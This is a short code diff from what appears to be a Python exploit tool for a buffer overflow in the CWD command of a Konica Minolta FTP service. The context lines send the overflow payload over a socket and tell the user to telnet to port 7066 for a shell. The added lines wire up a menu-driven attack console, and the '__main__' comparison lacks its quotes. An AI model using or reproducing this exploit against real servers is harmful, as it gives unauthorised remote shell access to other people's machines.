@@ -101,3 +101,8 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     s.send("CWD " + payload)
     s.close()
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+def main():
+  konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu()
+  konicaminoltacwdoverflowmenu.cmdloop("pdf-console attack(konica_minolta_cwd_overflow)% ")
+if __name__ == __main__:
+  main()
